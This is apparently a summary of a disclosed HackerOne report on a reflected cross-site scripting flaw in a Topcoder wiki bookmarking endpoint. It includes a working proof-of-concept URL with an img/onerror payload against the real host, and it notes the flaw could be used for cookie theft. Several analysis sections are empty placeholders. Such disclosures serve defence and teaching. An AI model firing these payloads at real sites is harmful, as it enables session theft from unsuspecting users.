# Reflected XSS on error page on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action

## Metadata
- **Source:** HackerOne
- **Report:** 866861 | https://hackerone.com/reports/866861
- **Submitted:** 2020-05-05
- **Reporter:** meryem0x
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hi :) 
In https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action `bookmarkPageId` parameter expects a number value. If you add XSS payload instead of number, an error page displays with XSS.

PoC
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?bookmarkPageId="><img src=x onerror=alert(document.domain)>`
{F816846}

## Impact

XSS can use to st

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi :) 
In https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action `bookmarkPageId` parameter expects a number value. If you add XSS payload instead of number, an error page displays with XSS.

PoC
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?bookmarkPageId="><img src=x onerror=alert(document.domain)>`
{F816846}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

</details>

---
*Analysed by Claude on 2026-05-24*
